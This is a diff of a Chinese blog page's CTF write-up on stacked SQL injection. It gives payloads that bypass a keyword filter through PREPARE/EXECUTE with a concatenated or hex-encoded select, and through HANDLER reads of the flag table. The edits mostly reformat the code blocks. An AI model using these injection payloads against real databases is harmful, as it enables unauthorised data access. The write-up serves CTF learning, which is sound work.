@@ -120,27 +120,27 @@
 <p>系统提示<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
 <p>可以通过堆叠注入的方式，来绕过select关键字</p>
 <p>查找数据名：</p>
-<pre><code class="hljs plaintext">1&#x27;;show databases;#</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;;show databases;#<br></code></pre></td></tr></table></figure>
 
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250306132906900.png"></p>
 <p>查看数据表：<code>1&#39;;show tables;#</code></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250306134039711.png"></p>
 <p>分别查两个表，发现第一个表1919810931114514下有1flag列</p>
-<pre><code class="hljs plaintext">1&#x27;; show columns from `1919810931114514`;#</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;; show columns from `1919810931114514`;#<br></code></pre></td></tr></table></figure>
 
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250306134150486.png"></p>
 <p>注意：如果表名是纯数字，需要用反引号包裹</p>
 <h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p><strong>预编译的方式拼接select 关键字</strong></p>
-<pre><code class="hljs plaintext">1&#x27;;sEt@a=concat(&quot;sel&quot;,&quot;ect flag from `1919810931114514`&quot;);PREPARE hacker from @a;EXECUTE hacker;#</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;;sEt@a=concat(&quot;sel&quot;,&quot;ect flag from `1919810931114514`&quot;);PREPARE hacker from @a;EXECUTE hacker;#<br></code></pre></td></tr></table></figure>
 
 <h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p><strong>16进制编码绕过select 关键字</strong></p>
-<pre><code class="hljs plaintext">select * from `1919810931114514`</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from `1919810931114514`<br></code></pre></td></tr></table></figure>
 
 <p>将上述语句进行16进制编码</p>
-<pre><code class="hljs plaintext">1&#x27;;sEt@a= 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @a;EXECUTE hacker;#</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;;sEt@a= 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @a;EXECUTE hacker;#<br></code></pre></td></tr></table></figure>
 
 <h3 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h3><p><strong>通过handler直接给出答案</strong></p>
-<pre><code class="hljs plaintext">1&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` READ NEXT;HANDLER `1919810931114514` CLOSE;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` READ NEXT;HANDLER `1919810931114514` CLOSE;<br></code></pre></td></tr></table></figure>
 
 <blockquote>
 <p>当<code>select、union、大小写</code>被过滤时，可使用<code>handler</code>语句</p>
@@ -797,5 +797,5 @@
 
 
 <!-- inject -->
-
+<script async src="/js/title.js"></script>
 </div></body></html>
